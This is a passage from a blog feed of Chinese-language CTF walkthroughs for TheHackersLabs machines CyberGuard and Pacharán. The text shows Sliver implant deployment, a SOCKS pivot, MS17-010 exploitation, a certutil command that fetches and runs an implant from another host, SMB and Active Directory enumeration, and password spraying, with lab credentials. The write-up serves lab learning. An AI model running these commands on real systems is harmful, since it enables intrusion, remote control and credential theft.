obfuscation is enabled\n[*] Build completed in 1m12s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/FORMIDABLE_FLOOR\n\nsliver > wg\n\n[*] Starting Wireguard listener ...\n[*] Successfully started job #1\n```\n\n上传到靶机并运行\n\n```bash\nchmod +x /var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n/var/www/cyberguard/storage/app/private/FORMIDABLE_FLOOR\n```\n\n然后可以在 `sliver` 服务端中看到连接上去了\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image11.png)\n\n和 `MSF` 差不多的操作\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image12.png)\n\n## 内网渗透\n\n### 信息收集\n\n我们查看 `databases.php` \n\n```bash\n'default' => [\n            'url' => env('REDIS_URL'),\n            'host' => env('REDIS_HOST', '127.0.0.1'),\n            'username' => env('REDIS_USERNAME'),\n            'password' => env('REDIS_PASSWORD'),\n            'port' => env('REDIS_PORT', '6379'),\n            'database' => env('REDIS_DB', '0'),\n        ],\n```\n\n发现数据库凭据存放在环境变量中\n\n```bash\nDB_PASSWORD=ZqBHR4MZ<f*+bv(J\nREDIS_HOST=127.0.0.1\nDB_HOST=127.0.0.1\nQUEUE_CONNECTION=database\n```\n\n得到一串密码 `ZqBHR4MZ<f*+bv(J`\n\n经过测试我们知道密码是 `ian` 账户的\n\n```bash\n[*] Started remote shell with pid 1069\n\nwww-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ su ian\nPassword: \nian@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ \n```\n\n查看正在监听的端口\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ ss -tulpn\nNetid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                             \nudp   UNCONN 0      0            0.0.0.0:59645      0.0.0.0:*                                                       \nudp   UNCONN 0      0            0.0.0.0:51236      0.0.0.0:*    users:((\"ss\",pid=1098,fd=7),(\"bash\",pid=1082,fd=7))\nudp   UNCONN 0      0               [::]:51236         [::]:*    users:((\"ss\",pid=1098,fd=3),(\"bash\",pid=1082,fd=3))\ntcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                       \ntcp   LISTEN 0      80         127.0.0.1:3306       0.0.0.0:*                                                       \ntcp   LISTEN 0      128             [::]:22            [::]:*                                                       \ntcp   LISTEN 0      511                *:8080             *:*  \n```\n\n查看 `ip` ，得到内网网段 `10.20.30.0/24`\n\n```bash\nwww-data@TheHackersLabs-2-Cyberguard:/var/www/cyberguard/config$ ip add\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 08:00:27:f1:07:77 brd ff:ff:ff:ff:ff:ff\n    inet 10.20.30.11/24 brd 10.20.30.255 scope global enp0s3\n       valid_lft forever preferred_lft forever\n    inet6 fe80::a00:27ff:fef1:777/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n### 搭建代理\n\n方便渗透内网主机，这里使用 `sliver`  搭建代理\n\n文档链接：https://sliver.sh/docs?name=Reverse+SOCKS\n\n这里使用 `WireGuard SOCKS5`\n\n```bash\nsliver (FORMIDABLE_FLOOR) > info \n\n        Session ID: 160113c3-b76b-4b38-a5eb-a03335a7dbb8\n              Name: FORMIDABLE_FLOOR\n          Hostname: TheHackersLabs-2-Cyberguard\n              UUID: ed3dcaa8-d130-48be-8973-73101c3c3c31\n          Username: www-data\n               UID: 33\n               GID: 33\n               PID: 1053\n                OS: linux\n           Version: Linux TheHackersLabs-2-Cyberguard 6.1.0-25-amd64\n            Locale: C\n              Arch: amd64\n         Active C2: wg://10.0.2.20:53\n    Remote Address: 100.64.0.3:65311\n         Proxy URL: \nReconnect Interval: 1m0s\n     First Contact: Mon Jul 28 12:49:33 CST 2025 (40m46s ago)\n      Last Checkin: Mon Jul 28 13:28:31 CST 2025 (1m48s ago)\n```\n\n创建 `WireGuard` 客户端配置\n\n```bash\nsliver (FORMIDABLE_FLOOR) > wg-config\n\n[*] New client config:[Interface]\nAddress = 100.64.0.6/16\nListenPort = 51902\nPrivateKey = MLVcslgYICxAUJMnhPF/h6LAiqOfjh1vF38pZdOt20w=\nMTU = 1420\n\n[Peer]\nPublicKey = q36gtpUVlt9b9vCe4ZuM8+tU7zrDmN9SCAuSQ2jTYgQ=\nAllowedIPs = 100.64.0.0/16\nEndpoint = 10.0.2.20:53\n```\n\n使用 `wg-quick` 进行连接\n\n```bash\n➜  CyberGuard vim wgsocks.conf\n```\n\n```bash\n➜  CyberGuard wg-quick up wgsocks            \n[#] ip link add wgsocks type wireguard\n[#] wg setconf wgsocks /dev/fd/63\n[#] ip -4 address add 100.64.0.6/16 dev wgsocks\n[#] ip link set mtu 1420 up dev wgsocks\n```\n\n再在 `sliver` 中运行 `wg-socks`\n\n```bash\nsliver (FORMIDABLE_FLOOR) > wg-socks start\n\n[*] Started SOCKS server on 100.64.0.3:3090\n```\n\n编辑 `/etc/proxychains4.conf` 文件\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image13.png)\n\n测试连接，使用代理连接 `10.20.30.11` 的 `SSH` 服务\n\n![image.png](/post-images/TheHackersLabsCyberGuard/image14.png)\n\n当前用户可以拿到 `user.txt`\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ cat user.txt \n1850axxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n### **10.20.30.11**\n\n查看 `sudo` 权限\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ sudo -l\nMatching Defaults entries for ian on TheHackersLabs-2-Cyberguard:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser ian may run the following commands on TheHackersLabs-2-Cyberguard:\n    (ALL) NOPASSWD: /usr/bin/tcpdump, /usr/sbin/arpspoof\n```\n\n我这里打算进行提权，但是`tcpdump` 并无法进行运行脚本，索性先放掉\n\n这里上传 `fscan` 进行内网枚举\n\n```bash\nsliver (FORMIDABLE_FLOOR) > upload ../../Tools/fscan/fscan_1.8.4\n\n[*] Wrote file to /var/www/cyberguard/config/fscan_1.8.4\n```\n\n指定 `IP` 范围 `10.20.30.1-255`\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ ./fscan_1.8.4 -h 10.20.30.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 10.20.30.11     is alive\n(icmp) Target 10.20.30.1      is alive\n(icmp) Target 10.20.30.3      is alive\n(icmp) Target 10.20.30.15     is alive\n[*] Icmp alive hosts len is: 4\n10.20.30.3:445 open\n10.20.30.3:139 open\n10.20.30.3:135 open\n10.20.30.1:80 open\n10.20.30.15:22 open\n10.20.30.11:22 open\n10.20.30.11:8080 open\n10.20.30.3:88 open\n10.20.30.1:8090 open\n[*] alive ports len is: 9\nstart vulscan\n[+] MS17-010 10.20.30.3 (Windows Server 2016 Datacenter 14393)\n[*] NetInfo \n[*]10.20.30.3\n   [->]WIN-VRU3GG3DPLJ\n   [->]10.20.30.3\n[*] NetBios 10.20.30.3      [+] DC:WIN-VRU3GG3DPLJ.cyberguard.thl      Windows Server 2016 Datacenter 14393\n[*] WebTitle http://10.20.30.11:8080   code:200 len:1045   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1         code:200 len:1039   title:Join Our Cybersecurity Team\n[*] WebTitle http://10.20.30.1:8090    code:200 len:2784   title:Login | OPNsense\n```\n\n### MS17-010 ✅\n\n竟然枚举出来了 `10.20.30.3` 存在永恒之蓝（MS17-010），尝试一波\n\n```bash\nproxychains4 -q msfconsole\n```\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"whoami\":\n\nnt authority\\system\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n然后可以直接读取 `root.txt`\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > set ComMAND type C:\\\\users\\\\Administrador\\\\Documents\\\\root.txt\nComMAND => type C:\\users\\Administrador\\Documents\\root.txt\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"type C:\\users\\Administrador\\Documents\\root.txt\":\n\n0257xxxxxxxxxxxxxxxxxxxxxxxxx\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n拿 `shell` 的话可以生成 `Windows` 植入物\n\n```bash\nsliver (FORMIDABLE_FLOOR) > generate -o windows --wg 10.0.2.20 -a amd64 -f exe \n\n[*] Generated unique ip for wg peer tun interface: 100.64.0.7\n[*] Generating new windows/amd64 implant binary\n[*] Symbol obfuscation is enabled\n[*] Build completed in 1m1s\n[*] Implant saved to /root/Desktop/TheHackersLabs/CyberGuard/LONG_PRIVATE.exe\n```\n\n上传到 `10.20.30.11` 并开启 `HTTP` 服务器\n\n```bash\nian@TheHackersLabs-2-Cyberguard:~$ python3 -m http.server 2131\nServing HTTP on 0.0.0.0 port 2131 (http://0.0.0.0:2131/) ...\n```\n\n然后通过 `certutil.exe` 下载到 `c` 盘\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command \"certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe C:\\\\LONG_PRIVATE.exe\"\n\"\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 10.20.30.3:445        - Target OS: Windows Server 2016 Datacenter 14393\n[*] 10.20.30.3:445        - Built a write-what-where primitive...\n[+] 10.20.30.3:445        - Overwrite complete... SYSTEM session obtained!\n[+] 10.20.30.3:445        - Service start timed out, OK if running a command or non-service executable...\n[*] 10.20.30.3:445        - Getting the command output...\n[*] 10.20.30.3:445        - Executing cleanup...\n[+] 10.20.30.3:445        - Cleanup was successful\n[+] 10.20.30.3:445        - Command completed successfully!\n[*] 10.20.30.3:445        - Output for \"certutil.exe -urlcache -split -f http://10.20.30.11:2131/LONG_PRIVATE.exe\":\n\n****  En lnea  ****\n  000000  ...\n  1280000\nCertUtil: -URLCache comando completado correctamente.\n\n[*] 10.20.30.3:445        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n之后运行 `LONG_PRIVATE.exe`\n\n```bash\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command \"C:\\\\LONG_PRIVATE.exe\"\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n```\n\n![image.jpg](/post-images/TheHackersLabsCyberGuard/images15.jpg)\n\n然后就拿到 `shell` 了\n\n```bash\nsliver (LONG_PRIVATE) > shell\n\n? This action is bad OPSEC, are you an adult? Yes\n\n[*] Wait approximately 10 seconds after exit, and press <enter> to continue\n[*] Opening shell tunnel (EOF to exit) ...\n\n[*] Started remote shell with pid 1292\n\nPS C:\\Windows\\system32> whoami\nwhoami\nnt authority\\system\n```\n\n## 总结\n\n蛮难的，在弹 `shell`的时候卡了很久（这里看了`WP`才知道要用`sliver`弹）\n\n打完之后发现，预期解并不是使用 `MS17-010`\n\n而是在另外一台 `Linux` 主机中监听数据包能得到 `Victor` 用户的 `Net-NTLM-hash` ，之后再使用 `certipy` 进行操作\n\n预期解WP：https://blog.thehackerslabs.com/resolucion-del-ctf-cyberguard/\n\n还有学习到了 `sliver` 这个 `C2` 框架，感觉还不错，不用自己再端口转发才能上线",
            "url": "https://www.sunsetaction.top/2025/07/28/TheHackersLabsCyberGuard",
            "title": "TheHackersLabs - CyberGuard",
            "summary": "CyberGuard https://labs.thehackerslabs.com/machine/25 一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。 Recon PortScan 枚举 HTTP 服务 目录爆破，这里扫描久了会被 ban 掉 这个 query 和输出结果感觉有股熟...",
            "date_modified": "2025-07-28T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "Linux",
                "MS17-010",
                "Sliver",
                "SQLInjection"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharán",
            "content_html": "\n# Pacharán\n\n> https://labs.thehackerslabs.com/machine/61\n> \n\n![image.png](/post-images/TheHackersLabsPacharán/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  Pacharán nmap -sn 192.168.69.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nNmap scan report for 192.168.69.1\nHost is up (0.00060s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report for 192.168.69.2\nHost is up (0.00034s latency).\nMAC Address: 08:00:27:5F:F4:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.69.69\nHost is up (0.00060s latency).\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.69.10\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.10 seconds\n```\n\n```bash\n➜  Pacharán nmap -sT -min-rate 10000 -p- 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:00 CST\nWarning: 192.168.69.69 giving up on port because retransmission cap hit (10).\nStrange read error from 192.168.69.69 (104 - 'Connection reset by peer')\nNmap scan report for 192.168.69.69\nHost is up (0.00020s latency).\nNot shown: 65236 closed tcp ports (conn-refused), 275 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.27 seconds\n```\n\n```bash\n➜  Pacharán nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.69.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 13:01 CST\nNmap scan report for 192.168.69.69\nHost is up (0.00052s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-27 12:01:34Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:4F:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:4f:85:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-time:\n|   date: 2025-07-27T12:01:36\n|_  start_date: 2025-07-27T11:55:15\n|_clock-skew: 6h59m57s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.52 ms 192.168.69.69\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.47 seconds\n```\n\n### 枚举\n\n`SMB` 匿名测试\n\n可以使用匿名账户\n\n```bash\n➜  Pacharán smbclient -L 192.168.69.69 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Admin remota\n        C$              Disk      Recurso predeterminado\n        IPC$            IPC       IPC remota\n        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión \n        NETLOGON2       Disk      \n        PACHARAN        Disk      \n        PDF Pro Virtual Printer Printer   Soy Hacker y arreglo impresoras\n        print$          Disk      Controladores de impresora\n        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión \n        Users           Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 192.168.69.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n直接用`nxc`全部拉下来\n\n```bash\n➜  Pacharán nxc smb 192.168.69.69 -u 'anonymous' -p '' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\anonymous: (Guest)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]     STATS_FLAG: True\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] EXCLUDE_FILTER: ['print$', 'ipc$']\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]   EXCLUDE_EXTS: ['ico', 'lnk']\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ            \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN                        \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  print$                          Controladores de impresora\nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users                           \nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] Saved share-file metadata to \"/root/.nxc/modules/nxc_spider_plus/192.168.69.69.json\".\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Shares:           10 (ADMIN$, C$, IPC$, NETLOGON, NETLOGON2, PACHARAN, PDF Pro Virtual Printer, print$, SYSVOL, Users)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Readable Shares:  2 (IPC$, NETLOGON2)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] SMB Filtered Shares:  1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total folders found:  0\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Total files found:    1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size average:    22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size min:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File size max:        22 B\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] File unique exts:     1 (txt)\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Downloads successful: 1\nSPIDER_PLUS 192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] All files processed successfully.\n```\n\n得到一个 `txt` 文件 `Orujo.txt`\n\n```bash\n➜  Pacharán cat Orujo.txt                                 \nPericodelospalotes6969#\n```\n\n像是一个凭据，测试一下\n\n```bash\n➜  Pacharán nxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999                             \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969 \n```\n\n成功拿到 `orujo` 的凭据\n\n```bash\n➜  Pacharán nxc ldap 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'                                  \nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\nLDAP        192.168.69.69   389    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\orujo:Pericodelospalotes6969\n\n➜  Pacharán nxc winrm 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969'\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\orujo:Pericodelospalotes6969\n```\n\n## 域分析\n\n收集信息上`BLoodHound`\n\n```bash\n➜  Pacharán bloodhound-python -d 'PACHARAN.thl' -ns 192.168.69.69 --zip -c All -dc 'WIN-VRU3GG3DPLJ.PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: pacharan.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Found 17 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.PACHARAN.THL\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250727132554_bloodhound.zip\n```\n\n当前用户所属组\n\n![image.png](/post-images/TheHackersLabsPacharán/image1.png)\n\n所有域用户\n\n![image.png](/post-images/TheHackersLabsPacharán/image2.png)\n\n远程管理组成员，只有一个，暂时设定为目标用户\n\n![image.png](/post-images/TheHackersLabsPacharán/image3.png)\n\n## To Whisky\n\n我们继续枚举一下信息\n\n拉取 `orujo` 用户可以下载的所有文件\n\n```bash\nnxc smb 192.168.69.69 -u 'orujo' -p 'Pericodelospalotes6969' --smb-timeout 9999 -M spider_plus -o DOWNLOAD_FLAG=True\n```\n\n能下载出来一个 `au.txt` 文件，是一个密码字典\n\n![image.png](/post-images/TheHackersLabsPacharán/image4.png)\n\n查询一下密码阈值\n\n```bash\n➜  PACHARAN bloodyAD -d 'PACHARAN.THL' -u orujo -p 'Pericodelospalotes6969' --dc-ip 192.168.69.69 get object 'DC=PACHARAN,DC=THL' --attr minPwdLength,maxPwdAge,minPwdAge,pwdHistoryLength,lockoutThreshold,lockoutDuration,lockOutObservationWindow,pwdProperties\n\ndistinguishedName: DC=PACHARAN,DC=THL\nlockOutObservationWindow: -18000000000\nlockoutDuration: -18000000000\nlockoutThreshold: 0\nmaxPwdAge: -42 days, 0:00:00\nminPwdAge: -1 day, 0:00:00\nminPwdLength: 7\npwdHistoryLength: 24\npwdProperties: 1\n```\n\n密码阈值为`0` ，锁定账户功能被禁用\n\n所以我们可以利用得到的字典来进行密码喷洒\n\n```bash\n➜  Pacharán nxc smb 192.168.69.69 -u users.txt  -p ah.txt --smb-timeout 9999 --continue-on-success | grep '[+]'\nSMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Whisky:MamasoyStream2er@ \n```\n\n得到`Whisky`的凭据，`Whisky:MamasoyStream2er@` \n\n## To Chivas Regal\n\n这里尝试了很多的攻击，例如 `Kerberoate`等\n\n再尝试枚举一下信息\n\nSMB 中我们能注意到 **`PDF Pro Virtual Printer WRITE`** ，应该是打印机共享\n\n并且描述：我是一名黑客，我修理打印机，通用文档转换器\n\n![image.png](/post-images/TheHackersLabsPacharán/image5.png)\n\n尝试连接上`RPCclient` 枚举打印机\n\n```bash\n➜  Pacharán rpcclient 192.168.69.69 -U pacharan.thl/Whisky%MamasoyStream2er@ \nrpcclient $> enumprinters\n        flags:[0x800000]\n        name:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras]\n        description:[\\\\192.168.69.69\\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]\n        comment:[Soy Hacker y arreglo impresoras]\n```\n\n我们还看到描述后还带这个字符串 `TurkisArrusPuchuchuSiu1` \n\n我们将其拿去进行密码喷洒\n\n```bash\n➜  Pacharán nxc smb 192.168.69.69 -u users.txt -p 'TurkisArrusPuchuchuSiu1' --smb-timeout 9999                \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] 